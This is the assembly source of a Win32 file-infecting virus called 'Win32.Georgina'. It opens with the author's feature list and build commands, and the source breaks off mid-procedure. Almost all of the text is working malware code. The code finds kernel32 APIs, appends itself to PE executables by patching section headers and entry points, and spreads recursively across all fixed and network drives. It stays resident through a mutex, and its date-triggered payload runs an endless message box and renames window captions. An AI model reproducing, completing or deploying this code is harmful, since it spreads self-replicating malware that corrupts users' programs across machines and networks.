
;                       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
;			@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
;			@@				@@
;			@@	Win32.Georgina.3657	@@
;			@@	(C)0ded by KiNETiK	@@
;			@@	     May, 2002		@@
;			@@				@@
;			@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
;			@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
;
;
;Hi guyz,
;
;Finally I finished coding my Win32.Georgina virus, so I can start to write a brief description:)
;This is Win32 per-process multithreaded resident virus, so every infected PE-file
;can launch its own copy of resident virus as soon as it determines that there's no
;other copy of virus running in memory.
;
;Brief Description
;-----------------
;
;        - Win32 appending virus, appends the last section of PE-file (infects only PE *.exe files)
;        - Infects Win9x/NT/2k/XP platforms (is not tested on WinME,but should work there too)
;        - Infects PE-files compressed with various PE-compressors (e.g. UPX)
;        - Infects all the logical drives, including network mapped drives
;        - Puts infection mark at the end of the infected file, in order to avoid multiple
;          infections (infection mark is an encrypted 12-byte string), also checks
;          PE-files for validity
;        - Per-process multithreaded residency, every running copy will be activated unless
;          other copy of virus is running
;        - Encrypted data strings (but not all strings are encrypted)
;        - Undetectable by some antiviruses (can't insist that it won't be detected by ALL
;          AVs)
;        - The payload consists of two separate threads:
;          1) an infinite loop of a MessageBox, with the virus payload info written there
;          2) Every 8 seconds changes recursively all the window captions to the string
;             "Georgina"
;        - The virus has its main thread which launches the other threads or checks every
;          second for the absence of other copy (if the other copy was running at the moment
;          when the 2nd copy was executed)
;        - Other features not mentioned here, just look at the source code and u'll
;          understand everything:)
;
;The virus DOESN'T have any destructive features, there's no need in them:)
;The activation date is 21st of every month or September 21st (depends on version).
;I don't wanna write a long description of every step the virus does, I guess the comments
;in the source are enough:)
;
;Greetingz
;---------
;
;My warmest greetingz to Georgina !!!
;This virus is ***totally*** dedicated to Georgina, the woman who I love and will love forever...
;
;My best regardz and greetingz to 29A members, guyz you are really cool!
;
;
;(C)0ded by KiNETiK, May 2002            e-mail: kinetik_fire@yahoo.com
;
;Compiling
;---------
;Compile the source with TASM 5.0:
;        tasm32 -ml -m5 -q -zn Georgina.asm
;        tlink32 -Tpe -c -x -aa Georgina.obj,,, import32
;        pewrsec.com Georgina.exe
;
;
;       The code is not fully optimized yet (could be smaller).
;       If u find any bugs or u have comments, feel free to contact me.
;;;;;;;;;;;;;;;;;;;;;;;;;

                .586p
                .model  flat

include W32.inc
include Imghdr.inc

                .data
                ; this stuff is for 1st generation only,for the MessageBox displaying the 1st generation info :)
                szCaption       db      "Dear user:)",0h
                szMessage       db      "Introducing Win32.Georgina virus!",0Dh
                                db      "Congratulations! :) 1st generation is successfully launched! :)",0Dh,0Dh
                                db      "(C)0ded by KiNETiK, May 2002",0Dh,0Dh
                                db      "Dedicated to Georgina",0h
                .code
main:

; Here is our virus code, the most difficult part to code:))
infect_section:
                call    delta_offset
delta_offset:
                pop     ebp
                mov     eax,ebp
                sub     eax,5h                                  ; substract 5h due to call instruction (call delta_offset)
                sub     ebp,offset delta_offset

                mov     dword ptr [ebp+_EBP],ebp                ; saving EBP in _EBP
                mov     dword ptr [ebp+_ImageBase],eax

                call    GetKernel32BaseAddress
                mov     dword ptr [ebp+K32Address],eax          ; Saving found kernel base

                mov     esi,eax
                call    GetUsefulAPIz

                call    LaunchVirusMainThread

                cmp     ebp,0h                  ; if EBP=0 that means we r in the 1st generation
                je      _1st_generation         ; jumping to the messagebox :)

                jmp     MainEnd                 ; jump back to the host

; GetKernel32BaseAddress
; Gets Kernel32 base address, return address in eax
GetKernel32BaseAddress  proc
                mov     esi,[esp+4h]            ; last item in stack is return address to CreateProcess API from Kernel32.dll
                                                ; adding 4h due to return EIP before calling this function
                and     esi,0FFFF0000h          ; align it with page size, 4K (1000h), K32 is mapped at page start
                mov     ecx,40h                 ; scan backward up to 64 pages...
@K32Loop:
                sub     esi,1000h                       ; go back
                dec     ecx                             ; ecx is counter
                cmp     ecx,0h                          ; scanned all the area?
                jz      @K32NotFound                    ; yes, that means didn't get K32 address yet:( hardcode it:(
                cmp     word ptr [esi],"ZM"             ; is it MZ executable?
                jne     @K32Loop                        ; no, tyry again; yes, go ahead
                mov     ebx,dword ptr [esi+3Ch]         ; locate PE header...
                cmp     dword ptr [esi+ebx],"EP"        ; it it really PE header?
                je      @K32Found                       ; wow! we found Kernel32 base address:)
                loopnz  @K32Loop                        ; main loop

@K32NotFound:
                mov     eax,0BFF70000h                          ; couldn't locate Kernel32 base
                ret                                             ; return hardcoded value for Win9x
@K32Found:
                mov     eax,esi
                ret
GetKernel32BaseAddress  endp

; GetK32APIAddress
; function gets API addresses
; esi = K32 base address, edi = funtion name string offset
GetK32APIAddress        proc
                push    esi
                mov     edx,dword ptr [esi+3Ch]                         ; locating PE header
                add     edx,78h                                         ; getting export table RVA
                add     esi,edx                                         ; setting new offset

                assume  esi:ptr IMAGE_DATA_DIRECTORY                    ; ok, here we get into data
                mov     edx,[esi].VirtualAddress                        ; directory and locate export RVA

                assume esi:
                mov     esi,dword ptr [ebp+K32Address]                  ; normalize it
                add     esi,edx

                assume  esi:ptr IMAGE_EXPORT_DIRECTORY                          ; prepair to get exports...
                mov     ecx,[esi].NumberOfFunctions                             ; getting number of exports
                mov     dword ptr [ebp+K32NumberOfExports],ecx
                mov     ebx,[esi].AddressOfFunctions                            ; Getting pointer to RVA of function addresses
                mov     edx,[esi].AddressOfNames                                ; Getting pointer to RVA of function names
                mov     eax,[esi].AddressOfNameOrdinals                         ; Getting pointer to RVA of name ordinals

                assume  esi:
                push    eax                                                     ; saving some stuff:)

                mov     esi,dword ptr [ebp+K32Address]                                          ; locating and saving function export
                add     ebx,esi                                                 ; address for later use
                mov     dword ptr [ebp+K32ExportAddress],ebx

                pop     eax                                                     ; getting the ordinals' address
                add     eax,esi                                                 ; address for later use
                mov     dword ptr [ebp+K32OrdinalsAddress],eax

                mov     edx,[esi+edx]                                           ; getting RVA where stored address
                add     esi,edx                                                 ; of name tables

@FindAPI:
                push    esi                     ; saving some stuff
                mov     edx,esi                 ; all these stuff is for parsing function names
@Loop1:
                cmp     byte ptr [esi],0h       ; check whether we found null-terminator of the funciton name string
                je      @Loop2                  ; yes, go ahead....
                inc     esi                     ; no, still scanning function name...
                jmp     @Loop1
@Loop2:
                inc     esi                     ; ok, we get function name size
                sub     esi,edx                 ; store it in ecx
                mov     ecx,esi
                pop     esi

                cld                             ; clear direction flag
                push    esi                     ; saving all registers we need....
                push    edi
                push    ecx
                repe    cmpsb                   ; comparing function names (esi=current,edi=function to find)
                pop     ecx                     ; restoring all our regs...
                pop     edi
                pop     esi
                je      @APIFound                                       ; found? ok, go ahead
                add     esi,ecx                                         ; not found, continue scanning...
                inc     dword ptr [ebp+Counter]                         ; function exports counter...
                mov     eax,dword ptr [ebp+Counter]                     ; still have functions to scan?
                mov     eax,dword ptr [ebp+K32NumberOfExports]          ; yes, continue
                cmp     dword ptr [ebp+Counter],eax                     ; no, damn, we failed:(
                jge     @APINotFound
                jl      @FindAPI
@APIFound:
                mov     eax,dword ptr [ebp+Counter]             ; current function export number = Counter
                shl     eax,1                                   ; eax = eax * 2, add to ordinal address, get the
                mov     esi,dword ptr [ebp+K32OrdinalsAddress]  ; function ordinal we need,
                add     esi,eax                                 ; normalize it
                lodsw                                           ; get that value in ordinal...
                shl     eax,2                                   ; eax = eax * 4, locate correct item in export address table
                mov     esi,dword ptr [ebp+K32ExportAddress]    ; get export address
                add     esi,eax                                 ; normalize it
                lodsd                                           ; get the function entry-point we need!
                add     eax,dword ptr [ebp+K32Address]          ; normalize it...
                mov     dword ptr [ebp+Counter],0h
                pop     esi
                ret                                             ; ohhh,finally we found it and getting out fom here:)
@APINotFound:
                mov     eax,00000000h                           ; we didn't find anything...returning error (0h)
                pop     esi
                ret
GetK32APIAddress   endp

;Getting all useful APIz we need...
GetUsefulAPIz   proc
                ; Now we get useful functions from Kernel32
                lea     edi,[ebp+szGetProcAddress]                             ; edi must have offset of the function name to find
                call    GetK32APIAddress
                mov     dword ptr [ebp+_GetProcAddress],eax

                lea     edi,[ebp+szGetModuleHandleA]
                call    GetK32APIAddress
                mov     dword ptr [ebp+_GetModuleHandleA],eax

                lea     edi,[ebp+szLoadLibraryA]
                call    GetK32APIAddress
                mov     dword ptr [ebp+_LoadLibraryA],eax

                lea     edi,[ebp+szGetFileAttributesA]
                call    GetK32APIAddress
                mov     dword ptr [ebp+_GetFileAttributesA],eax

                lea     edi,[ebp+szSetFileAttributesA]
                call    GetK32APIAddress
                mov     dword ptr [ebp+_SetFileAttributesA],eax

                lea     edi,[ebp+szCreateFileA]
                call    GetK32APIAddress
                mov     dword ptr [ebp+_CreateFileA],eax

                lea     edi,[ebp+szCreateFileMappingA]
                call    GetK32APIAddress
                mov     dword ptr [ebp+_CreateFileMappingA],eax

                lea     edi,[ebp+szMapViewOfFile]
                call    GetK32APIAddress
                mov     dword ptr [ebp+_MapViewOfFile],eax

                lea     edi,[ebp+szUnmapViewOfFile]
                call    GetK32APIAddress
                mov     dword ptr [ebp+_UnmapViewOfFile],eax

                lea     edi,[ebp+szFindFirstFileA]
                call    GetK32APIAddress
                mov     dword ptr [ebp+_FindFirstFileA],eax

                lea     edi,[ebp+szFindNextFileA]
                call    GetK32APIAddress
                mov     dword ptr [ebp+_FindNextFileA],eax

                lea     edi,[ebp+szFindClose]
                call    GetK32APIAddress
                mov     dword ptr [ebp+_FindClose],eax

                lea     edi,[ebp+szSetCurrentDirectoryA]
                call    GetK32APIAddress
                mov     dword ptr [ebp+_SetCurrentDirectoryA],eax

                lea     edi,[ebp+szGetLocalTime]
                call    GetK32APIAddress
                mov     dword ptr [ebp+_GetLocalTime],eax

                lea     edi,[ebp+szCreateThread]
                call    GetK32APIAddress
                mov     dword ptr [ebp+_CreateThread],eax

                lea     edi,[ebp+szSetThreadPriority]
                call    GetK32APIAddress
                mov     dword ptr [ebp+_SetThreadPriority],eax

                lea     edi,[ebp+szResumeThread]
                call    GetK32APIAddress
                mov     dword ptr [ebp+_ResumeThread],eax

                lea     edi,[ebp+szCreateMutexA]
                call    GetK32APIAddress
                mov     dword ptr [ebp+_CreateMutexA],eax

                lea     edi,[ebp+szOpenMutexA]
                call    GetK32APIAddress
                mov     dword ptr [ebp+_OpenMutexA],eax

                lea     edi,[ebp+szSleep]
                call    GetK32APIAddress
                mov     dword ptr [ebp+_Sleep],eax

                lea     edi,[ebp+szGetLogicalDrives]
                call    GetK32APIAddress
                mov     dword ptr [ebp+_GetLogicalDrives],eax

                lea     edi,[ebp+szGetDriveTypeA]
                call    GetK32APIAddress
                mov     dword ptr [ebp+_GetDriveTypeA],eax

                lea     edi,[ebp+szGetFileSize]
                call    GetK32APIAddress
                mov     dword ptr [ebp+_GetFileSize],eax

                lea     edi,[ebp+szCloseHandle]
                call    GetK32APIAddress
                mov     dword ptr [ebp+_CloseHandle],eax

                lea     edi,[ebp+szVirtualAlloc]
                call    GetK32APIAddress
                mov     dword ptr [ebp+_VirtualAlloc],eax

                ;Now we check/load User32.dll for getting functions from it
                lea     eax,[ebp+szUser32Dll]
                push    eax
                call    [ebp+_GetModuleHandleA]
                cmp     eax,00000000h
                jne     @_U32Found

                lea     eax,[ebp+szUser32Dll]
                push    eax
                call    [ebp+_LoadLibraryA]
                cmp     eax,00000000h
                je      MainEnd

                lea     eax,[ebp+szUser32Dll]
                push    eax
                call    [ebp+_GetModuleHandleA]
                cmp     eax,00000000h
                jne     @_U32Found
                je      MainEnd
@_U32Found:
                ;now we get useful functions from User32
                mov     dword ptr [ebp+U32Address],eax

                lea     eax,[ebp+szMessageBoxA]
                push    eax
                push    [ebp+U32Address]
                call    [ebp+_GetProcAddress]
                mov     dword ptr [ebp+_MessageBoxA],eax

                lea     eax,[ebp+szSetWindowTextA]
                push    eax
                push    [ebp+U32Address]
                call    [ebp+_GetProcAddress]
                mov     dword ptr [ebp+_SetWindowTextA],eax

                lea     eax,[ebp+szGetTopWindow]
                push    eax
                push    [ebp+U32Address]
                call    [ebp+_GetProcAddress]
                mov     dword ptr [ebp+_GetTopWindow],eax

                lea     eax,[ebp+szGetWindow]
                push    eax
                push    [ebp+U32Address]
                call    [ebp+_GetProcAddress]
                mov     dword ptr [ebp+_GetWindow],eax

                ret                                             ; end of looking for all API function addresses we need
GetUsefulAPIz   endp

;edi = filename address
InfectFile      proc                                            ; function that infects single file
                pushad
                ; initting vars
                xor     eax,eax
                mov     dword ptr [ebp+pMemory],eax
                mov     dword ptr [ebp+FileHandle],eax
                mov     dword ptr [ebp+FileMappedHandle],eax

                ; Clearing  & storing fileattributes
                push    edi
                call    [ebp+_GetFileAttributesA]
                mov     dword ptr [ebp+FileAttrib],eax

                push    FILE_ATTRIBUTE_NORMAL
                push    edi
                call    [ebp+_SetFileAttributesA]
                ; File attributes are cleared and stored now...

                call    [ebp+_CreateFileA],edi,GENERIC_READ or GENERIC_WRITE,0,0,OPEN_EXISTING,0,0
                cmp     eax,INVALID_HANDLE_VALUE
                je      @_InfectFailure

                mov     dword ptr [ebp+FileHandle],eax                  ; Getting file size, calulating
                push    0h
                push    [ebp+FileHandle]
                call    [ebp+_GetFileSize]                              ; new file size, need for mapping it
                cmp     eax,-1
                je      @_InfectFailure
                mov     dword ptr [ebp+FileSize],eax

                cmp     [ebp+FileSize],3Ch                              ; we r sure that PE file can't be so small,
                jbe     @_InfectFailure                                 ; actually it's an additional check of PE validity

                ; Checking if MZ/PE file and already infected or not
                push    0h
                push    [ebp+FileSize]
                push    0h
                push    PAGE_READONLY
                push    0h
                push    [ebp+FileHandle]
                call    [ebp+_CreateFileMappingA]
                cmp     eax,0h
                je      @_InfectFailure
                mov     dword ptr [ebp+FileMappedHandle],eax

                push    0h
                push    0h
                push    0h
                push    FILE_MAP_READ
                push    [ebp+FileMappedHandle]
                call    [ebp+_MapViewOfFile]
                cmp     eax,0h
                je      @_InfectFailure
                mov     esi,eax
                mov     dword ptr [ebp+pMemory],esi

                cmp     word ptr [esi],IMAGE_DOS_SIGNATURE              ; Checking if the file iz valid MZ
                jne     @_InfectFailure                                 ; executable, if so we are trying
                mov     eax,dword ptr [esi+03Ch]                        ; to locate the PE header offset
                mov     dword ptr [ebp+PEHdrOffset],eax

                mov     ebx,[ebp+FileSize]                              ; checking the validy of MZ/PE file
                cmp     ebx,eax                                         ; by comparing file size and possible
                jbe     @_InfectFailure                                 ; PE header and start offsets

                add     esi,eax
                xor     eax,eax
                cmp     word ptr [esi],IMAGE_NT_SIGNATURE               ; Checking if valid PE, if so,
                jne     @_InfectFailure                                 ; starting PE header midifications...
                                                                        ; if not, return error
                assume  esi:                                            ; checking if PE file is already infected or not
                mov     esi,dword ptr [ebp+pMemory]                     ; At the end of PE file we put special magic
                mov     eax,dword ptr [ebp+FileSize]                    ; bytes,thus generating infection mark
                sub     eax,12
                add     esi,eax
                cmp     dword ptr [esi],0CFED8A8Ah                      ; magic bytes
                jne     @InfectionStart
                cmp     dword ptr [esi+4],0C3CDD8C5h                    ; magic bytes
                jne     @InfectionStart
                cmp     dword ptr [esi+8],8A8ACBC4h                     ; magic bytes
                je      @_InfectFailure
                ; End of checking whether MZ/PE and already infected or not
@InfectionStart:
                ; Starting infection here
                push    edi
                xor     eax,eax
                mov     eax,dword ptr [ebp+FileSize]
                add     eax,INFECTLENGTH + 12           ; We store infection mark here in additional 12 bytes
                push    0h
                push    eax
                push    0h
                push    PAGE_READWRITE
                push    0h
                push    [ebp+FileHandle]
                call    [ebp+_CreateFileMappingA]
                cmp     eax,0h
                je      @_InfectFailure
                mov     dword ptr [ebp+FileMappedHandle],eax

                push    0h
                push    0h
                push    0h
                push    FILE_MAP_ALL_ACCESS
                push    [ebp+FileMappedHandle]
                call    [ebp+_MapViewOfFile]
                cmp     eax,0h
                je      @_InfectFailure
                mov     esi,eax
                mov     dword ptr [ebp+pMemory],esi

                mov     eax,dword ptr [esi+03Ch]                        ; locating the PE header offset
                mov     dword ptr [ebp+PEHdrOffset],eax                 ; saving it
                add     esi,eax                                         ; normalizing the address
                xor     eax,eax

                assume  esi: ptr IMAGE_NT_HEADERS
                mov     ax,[esi].FileHeader.NumberOfSections            ; Modifying PE header
                mov     dword ptr [ebp+SectionsNum],eax                 ; Getting sections number
                mov     eax,[esi].OptionalHeader.AddressOfEntryPoint    ; Getting entry-point
                mov     dword ptr [ebp+OldEntryPoint],eax
                mov     eax,[esi].OptionalHeader.FileAlignment
                mov     dword ptr [ebp+dFileAlignment],eax

                assume esi:
                xor     eax,eax
                mov     esi,dword ptr [ebp+pMemory]                                     ; points to file start
                add     esi,dword ptr [ebp+PEHdrOffset]                                 ; points to PE header start
                mov     ax,word ptr [esi+14h]                           ; getting IOH size
                add     esi,18h                                         ; adding IFH size
                add     esi,eax                                         ; calculating the overall offset

                mov     eax,28h                                         ; one section's size=28h
                mov     ecx,dword ptr [ebp+SectionsNum]                                 ; how many sections
                dec     ecx
                imul    ecx                                             ; multiplying, section_num * section_size
                add     esi,eax                                         ; getting last section's offset

                assume  esi: ptr IMAGE_SECTION_HEADER
                push    esi

                mov     eax,[esi].SVirtualAddress                       ; will use it later
                push    eax

                mov     edx,dword ptr [ebp+FileSize]                    ; here we calculate SizeOfRawData and save it
                sub     edx,[esi].PointerToRawData                      ; for later use
                push    edx
                add     edx,INFECTLENGTH                                ; add infection block (virus) size
                mov     [esi].SVirtualSize,edx                          ; save this value in VirtualSize and
                mov     [esi].SizeOfRawData,edx                         ; SizeOfRawData fields

                mov     eax,[esi].SVirtualSize                          ; starting to calculate new SizeOfImageValue ...
                add     eax,[esi].SVirtualAddress

                assume  esi:                                            ; normalze the pointer, so we are at the field that
                mov     esi,dword ptr [ebp+pMemory]                     ; we'r gonna modify
                add     esi,dword ptr [ebp+PEHdrOffset]
                assume  esi: ptr IMAGE_NT_HEADERS
                mov     [esi].OptionalHeader.SizeOfImage,eax
                pop     edx                                             ; restoring SizeOfRawData value
                pop     eax                                             ; ..and VirtualAddress value
                add     eax,edx                                         ; add them,and...
                mov     [esi].OptionalHeader.AddressOfEntryPoint,eax    ; we get new entry-point
                mov     dword ptr [ebp+_EntryPoint],eax                 ; Another correct way to get the return point to host

                pop     esi
                mov     eax,CHARSNEW                                    ; new characteristics for section
                mov     [esi].SFlags,eax

                assume  esi:
                mov     ecx,INFECTLENGTH                                ; infecting section size
                mov     edi,dword ptr [ebp+pMemory]                                     ; prepare to add the last section
                add     edi,dword ptr [ebp+FileSize]                                    ; where to copy
                lea     eax,[ebp+infect_section]                              ; getting section's address
                mov     esi,eax                                         ; setting up destination address
                rep     movsb                                           ; copying bytes...

                ; Adding infection mark, encrypted string...
                lea     esi,[ebp+InfectionMark]
                mov     ecx,12
                rep     movsb
                ; Infection mark added...

                pop     edi
                popad
                mov     eax,1h
@InfectFailure:
                push    eax

                mov     eax,dword ptr [ebp+pMemory]
                cmp     eax,0h
                je      @InfectFailure1
                push    [ebp+pMemory]
                call    [ebp+_UnmapViewOfFile]
@InfectFailure1:
                mov     eax,dword ptr [ebp+FileMappedHandle]
                cmp     eax,0h
                je      @InfectFailure2
                push    [ebp+FileMappedHandle]
                call    [ebp+_CloseHandle]
@InfectFailure2:
                mov     eax,dword ptr [ebp+FileHandle]
                cmp     eax,0h
                je      @InfectFailure3
                push    [ebp+FileHandle]
                call    [ebp+_CloseHandle]
@InfectFailure3:
                push    [ebp+FileAttrib]
                push    edi
                call    [ebp+_SetFileAttributesA]

                pop     eax
                ret
@_InfectFailure:
                popad
                mov     eax,0h
                jmp     @InfectFailure
InfectFile      endp

; Infects the given path recursively...
; I'm not gonna comment all the lines in this function, it's really annoying to code stuff like this, so
; if you wanna understand it better, I guess it's easier to code this function in C/C++ and then
; translate it to ASM, this way will take less time:)
; edi = path to infect
InfectPath      proc
                push    [ebp+FindHandle]

                push    edi
                call    [ebp+_SetCurrentDirectoryA]
                cmp     eax,0h
                je      @ExitInfectPath2

                lea     ebx,[ebp+offset FindResult]
                push    ebx
                lea     ebx,[ebp+offset szEXEMask]
                push    ebx
                call    [ebp+_FindFirstFileA]
                mov     [ebp+FindHandle],eax
                cmp     eax,INVALID_HANDLE_VALUE
                je      @DirLoop

                lea     esi,[ebp+FindResult]
                assume  esi: ptr WIN32_FIND_DATA
                lea     edi,[ebp+FindResult.fd_cFileName]

                call    InfectFile

                mov     ecx,MAX_PATH
                xor     al,al
                rep     stosb
@NextLoop1:
                lea     ebx,[ebp+offset FindResult]
                push    ebx
                push    [ebp+FindHandle]
                call    [ebp+_FindNextFileA]
                cmp     eax,0h
                je      @DirLoop

                push    eax
                lea     edi,[ebp+FindResult.fd_cFileName]

                call    InfectFile

                mov     ecx,MAX_PATH
                xor     al,al
                rep     stosb
                pop     eax
                cmp     eax,0h
                jne     @NextLoop1

@DirLoop:
                push    [ebp+FindHandle]
                call    [ebp+_FindClose]
                lea     ebx,[ebp+offset FindResult]
                push    ebx
                lea     ebx,[ebp+offset szGlobalMask]
                push    ebx
                call    [ebp+_FindFirstFileA]
                mov     [ebp+FindHandle],eax
                cmp     eax,INVALID_HANDLE_VALUE
                je      @ExitInfectPath1
@NextLoop2:
                lea     esi,[ebp+FindResult]
                assume  esi: ptr WIN32_FIND_DATA
                mov     edx,[esi].fd_dwFileAttributes
                and     edx,FILE_ATTRIBUTE_DIRECTORY
                cmp     edx,0h
                je      @NextLoop2Jump
                cmp     [esi].fd_cFileName,2Eh             ; ASCII for '.'
                je      @NextLoop2Jump
                lea     edi,[ebp+FindResult.fd_cFileName]
                call    InfectPath
@NextLoop2Jump:
                lea     ebx,[ebp+offset FindResult]
                push    ebx
                push    [ebp+FindHandle]
                call    [ebp+_FindNextFileA]
                cmp     eax,0h
                jnz     @NextLoop2

@ExitInfectPath1:
                lea     ebx,[ebp+offset szUpDir]
                push    ebx
                call    [ebp+_SetCurrentDirectoryA]
                push    [ebp+FindHandle]
                call    [ebp+_FindClose]
@ExitInfectPath2:
                pop     [ebp+FindHandle]
                ret
InfectPath      endp

; this is the payload
PayLoad         proc
                pushad
                lea     ebx,[ebp+offset Time]                   ; getting system date/time
                push    ebx                                     ; using API GetLocalTime
                call    [ebp+_GetLocalTime]
                ;mov     bx,[ebp+Time.st_wMonth]                 ; launching the visual payload when it's the right date
                ;cmp     bx,9                           ; we check here the month,in this version will work on 21st of every month
                ;jne     @SkipPayloadKernel                      ; otherwise skip visual payload
                mov     bx,[ebp+Time.st_wDay]
                cmp     bx,21
                jne     @SkipPayloadKernel
@PayloadKernel:
                lea     ebx,[ebp+offset ThreadID1]              ; launching a thread which nags the user with a messagebox
                push    ebx
                push    0h
                lea     ebx,[ebp+_EBP]
                push    ebx
                lea     ebx,[ebp+offset FuckingNagger]
                push    ebx
                push    0h
                push    0h
                call    [ebp+_CreateThread]

                lea     ebx,[ebp+offset ThreadID2]              ; launching a thread which periodically changes captions of all
                push    ebx                                     ; active windows possible
                push    0h
                lea     ebx,[ebp+_EBP]
                push    ebx
                lea     ebx,[ebp+offset Win32GeorginaPayload]
                push    ebx
                push    0h
                push    0h
                call    [ebp+_CreateThread]
@SkipPayloadKernel:
                popad
                ret
PayLoad         endp

; edi = handle of the most parent window to change the captions
ChangeWndText   proc
                cmp     edi,0h
                je      @CWT1

                lea     ebx,[ebp+offset szGeorgina]             ; changes window's caption
                push    ebx
                push    edi
                call    [ebp+_SetWindowTextA]
@CWT1:
                push    edi
                call    [ebp+_GetTopWindow]                     ; getting top window
                cmp     eax,0h
                je      @CWT2

                push    edi
                mov     edi,eax
                call    ChangeWndText                           ; recursively change the window caption of sub-windows
                pop     edi
@CWT2:
                push    2h                                      ; 2h = GW_HWNDNEXT
                push    edi
                call    [ebp+_GetWindow]                        ; recursively change the window caption of sub-windows,
                cmp     eax,0h                                  ; iteration over next windows...
                je      @CWT3

                push    edi
                mov     edi,eax
                call    ChangeWndText                           ; ...and again entering the recursive part
                pop     edi
@CWT3:
                ret
ChangeWndText   endp

FuckingNagger   proc
                pushad
                ; Here we try to get parameter EBP passed to the new thread...
                mov     ebp,[ebp+0Ch]            ; 0Ch = 12, 0Ch points to the first parameter in the stack in a new thread
                mov     ebp,[ebp]

                push    PAGE_READWRITE                  ; allocating virtual memory to decrypt the payload message
                push    MEM_COMMIT
                push    100h
                push    0h
                call    [ebp+_VirtualAlloc]
                cmp     eax,0h
                je      @_not_alloced
                mov     [ebp+pVirtualMemory],eax
                jmp     @_alloced
@_not_alloced:
                lea     eax,[ebp+offset szVirus]
                mov     [ebp+pVirtualMemory],eax
@_alloced:
                call    CryptVirusMessage               ; decrypting payload message
@FuckingNagger:
                push    0h                              ; running forever loop of messagebox :)
                lea     ebx,[ebp+offset szGeorgina]
                push    ebx
                push    [ebp+pVirtualMemory]
                push    0h
                call    [ebp+_MessageBoxA]
                jmp     @FuckingNagger

                pushad
                ret
FuckingNagger   endp

Win32GeorginaPayload     proc
                pushad
                ; Here we try to get parameter EBP passed to the new thread...
                mov     ebp,[ebp+0Ch]            ; 0Ch = 12, 0Ch points to the first parameter in the stack in a new thread
                mov     ebp,[ebp]
@ForeverPayload:
                xor     edi,edi
                call    ChangeWndText
                push    8000                    ; 8 seconds of delay between each update of the window captions
                call    [ebp+_Sleep]
                jmp     @ForeverPayload

                popad
                ret
Win32GeorginaPayload     endp

CryptVirusMessage       proc
                pushad
                ; Decrypting virus message string

                lea     esi,[ebp+offset szVirus]
                mov     edi,[ebp+pVirtualMemory]
                xor     ecx,ecx
                mov     cl,szVirusMsgSize
                cld
@decrypt:
                lodsb                           ; performing simple XOR crypt/decrypt
                xor     al,0AAh
                stosb
                loopnz  @decrypt

                popad
                ret
CryptVirusMessage       endp

CryptMutexName  proc
                pushad
                ; Decrypting mutex name string....
                lea     esi,[ebp+offset szMutexName]
                mov     edi,esi
                xor     ecx,ecx
                mov     cl,MutexNameSize
                cld
@_decrypt_mutex:
                lodsb                           ; performing simple XOR crypt/decrypt
                xor     al,0AAh
                stosb
                loopnz  @_decrypt_mutex

                popad
                ret
CryptMutexName  endp

CheckForCopies  proc                                            ; checks whether other resident copy of virus is running
                call    CryptMutexName                          ; decrypts mutex name
                lea     ebx,[ebp+offset szMutexName]            ; mutex is used to determine the presence of other copy
                push    ebx
                push    0h
                push    1F0001h                                 ; 1F0001h = MUTEX_ALL_ACCESS
                call    [ebp+_OpenMutexA]                       ; OpenMutexA returns handle to mutex it it exists already
                cmp     eax,0h                                  ; if there's no mutex,try to create it...
                jne     @_mutex_exists

                push    ebx                                     ; creating mutex...
                push    1h
                push    0h
                call    [ebp+_CreateMutexA]
                cmp     eax,0h
                je      @_no_mutex_created
                jne     @_mutex_created
@_no_mutex_created:
                call    CryptMutexName
                mov     eax,0FFFFFFFEh                  ; error, no mutex exists and can't be created
                ret
@_mutex_exists:
                push    eax                             ; IMPORTANT!!! to close opened mutex handle in order for system to kill the
                call    [ebp+_CloseHandle]              ; the mutex which is always checked as a residency flag!
                call    CryptMutexName
                mov     eax,0FFFFFFFFh                  ; error, mutex exists and can't be created
                ret
@_mutex_created:
                call    CryptMutexName
                mov     eax,0h                          ; success, there was no mutex in the system and it has been just created
                ret
CheckForCopies  endp

StartInfection  proc
                pushad
                ; Here we try to get parameter EBP passed to the new thread...
                mov     ebp,[ebp+0Ch]            ; 0Ch = 12, 0Ch points to the first parameter in the stack in a new thread
                mov     ebp,[ebp]

                call    [ebp+_GetLogicalDrives]         ; getting logical drives....
                mov     ebx,eax
                xor     ecx,ecx
@DriveLoop:
                push    ecx                             ; and checking whether it's HD or netwrok drive...
                mov     edx,1h
                shl     edx,cl
                push    ebx
                and     ebx,edx
                cmp     ebx,0h
                je      @_do_not_infect_disk

                mov     edx,65                          ; ASCII for 'A'
                add     edx,ecx
                lea     edi,[ebp+offset szDestDir]
                mov     [edi],dl

                push    edi
                call    [ebp+_GetDriveTypeA]
                cmp     eax,3h                          ; DRIVE_FIXED = 3, according to WinBase.h
                je      @_infect_disk
                cmp     eax,4h                          ; DRIVE_REMOTE = 4, according to WinBase.h
                je      @_infect_disk
                jmp     @_do_not_infect_disk
@_infect_disk:
                lea     edi,[ebp+offset szDestDir]
                call    InfectPath
@_do_not_infect_disk:
                pop     ebx
                pop     ecx
                inc     ecx
                cmp     ecx,32
                jl      @DriveLoop

                popad
                ret
StartInfection  endp

VirusMainThread proc                            ;if no other copy of virus is running then spawns the infector and the payload
                pushad
                ; Here we try to get parameter EBP passed to the new thread...
                mov     ebp,[ebp+0Ch]           ; 0Ch = 12, 0Ch points to the first parameter in the stack in a new thread
                mov     ebp,[ebp]
@MainLoop:
                call    CheckForCopies
                cmp     eax,0h
                je      @StartAllSubRoutines
                push    1000                    ; Sleeping 1 second(s) before performing next check of running copies
                call    [ebp+_Sleep]
                jmp     @MainLoop
@StartAllSubRoutines:
                ; starting the low priority thread for infecting
                lea     ebx,[ebp+offset ThreadID3]
                push    ebx
                push    CREATE_SUSPENDED                        ; 0h is when u need to run the thread immediately
                lea     ebx,[ebp+_EBP]
                push    ebx
                lea     ebx,[ebp+offset StartInfection]
                push    ebx
                push    0h
                push    0h
                call    [ebp+_CreateThread]
                cmp     eax,0
                je      @VirusMainThreadEnd
                push    eax

                push    THREAD_PRIORITY_BELOW_NORMAL
                push    eax
                call    [ebp+_SetThreadPriority]

                call    [ebp+_ResumeThread]
                ; end of starting for the low priority thread for infecting

                ; starting the payload (it'll decide itself to continue or to stop)
                call    PayLoad
                ; exitting our virus main thread, we consider all jobs are done and all the threads are launched!
@VirusMainThreadEnd:
                popad
                ret
VirusMainThread endp

LaunchVirusMainThread   proc                            ; launching viri's main thread...
                pushad
                lea     ebx,[ebp+offset ThreadID3]
                push    ebx
                push    0h
